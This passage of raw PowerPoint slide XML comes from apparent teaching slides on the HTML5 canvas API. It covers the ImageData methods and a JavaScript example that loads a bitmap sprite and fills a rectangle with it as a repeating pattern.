              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>location</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>actual</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>are</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>defined</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>by</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>dx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dWidth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dHeight</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>createImageData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>returns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> an ImageData </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>which</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>filled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>transparent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>black</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>. ImageData </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>contains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>following</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>attributes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>height</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>data, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>which</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>CanvasPixelArray</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>which</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> x 4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>integers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>Each</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>pixel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>red</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>green</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>blue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> &amp; alpha</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>getImageData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(x, y, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>returns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> an ImageData </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>which</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>contains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>rectangular</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>area</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>putImageData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>imagedata, dx, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dirtyX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dirtyY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dirtyWidth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dirtyHeight</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>writes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>  imageData into (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>dx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>dy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" i="1"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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3455C602-FF39-4D82-8570-287995CB7464}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Loading a Bitmap and Displaying It</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="150531" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83CDAC36-47F4-42FB-A965-281FC4F3E559}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1340768"/>
            <a:ext cx="10972800" cy="5328592"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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var</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sprite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begin</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document</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getElementById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canvas</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canvas</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getContext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"2d"</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do</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your</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drawing</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here</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sprite</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a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Image</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sprite</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onload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>draw</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call</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draw</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after</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> image is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fully</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loaded</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sprite</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src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> =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assets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/redball.png"</a:t>
            </a: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start</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loading</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bitmap</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now</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> this </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>won't</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be</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executed</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until</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sprite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>loaded</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function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>draw</a:t>
            </a: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let</a:t>
            </a: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pattern</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createPattern</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">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sprite</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repeat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001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fillStyle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>pattern</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r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ctx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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fillRect</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400</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300</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            }</a:t>
            </a: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script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onload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795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>begin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>()"</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canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id</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canvas</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width</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"1024"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"768"</a:t>
